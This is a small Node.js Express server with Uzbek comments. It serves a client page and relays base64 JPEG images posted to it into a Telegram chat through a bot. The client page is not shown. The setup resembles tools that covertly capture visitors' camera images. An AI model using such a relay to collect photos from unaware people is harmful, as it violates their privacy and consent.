const express = require('express');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const FormData = require('form-data');
require('dotenv').config();

const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'client.html'));
});

app.post('/send-photo', async (req, res) => {
  try {
    const base64Data = req.body.image.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = path.join(__dirname, 'photo.jpg');

    fs.writeFileSync(filePath, base64Data, 'base64');

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', fs.createReadStream(filePath));

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders()
    });

    fs.unlinkSync(filePath); // vaqtincha faylni o'chirish

    res.sendStatus(200);
  } catch (err) {
    console.error('❌ Xato:', err.message);
    res.status(500).send('Server error');
  }
});

app.listen(3000, () => {
  console.log('✅ Server ishga tushdi');
});
